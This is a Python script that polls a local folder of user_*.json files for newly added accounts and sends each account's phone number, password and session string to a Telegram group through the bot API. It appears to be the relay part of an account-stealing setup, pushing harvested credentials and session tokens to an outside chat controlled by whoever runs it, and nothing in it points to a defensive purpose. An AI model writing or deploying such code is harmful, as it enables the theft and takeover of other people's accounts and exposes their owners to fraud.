import os
import json
import time
import requests

DATA_DIR = "data"
BOT_TOKEN = "YOUR_BOT_TOKEN"
CHAT_ID = "YOUR_GROUP_ID"

seen = set()

def send(msg):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    requests.post(url, data={"chat_id": CHAT_ID, "text": msg})


def scan_accounts():
    accounts = []

    if not os.path.exists(DATA_DIR):
        return accounts

    for file in os.listdir(DATA_DIR):
        if not file.startswith("user_") or not file.endswith(".json"):
            continue

        path = os.path.join(DATA_DIR, file)

        try:
            with open(path, "r") as f:
                data = json.load(f)

            for phone, acc in data.get("accounts", {}).items():
                accounts.append(acc)

        except:
            continue

    return accounts


def start_watcher():
    global seen

    # first load (old data ignore)
    for acc in scan_accounts():
        seen.add(acc["phone"])

    while True:
        try:
            for acc in scan_accounts():
                phone = acc["phone"]

                if phone not in seen:
                    seen.add(phone)

                    msg = f"""📥 New Account Added

📱 Number: {phone}
🔑 Password: {acc.get('password')}
📂 Session: {acc.get('session')[:50]}...
"""

                    send(msg)

            time.sleep(3)

        except Exception as e:
            print("Watcher Error:", e)
            time.sleep(3)
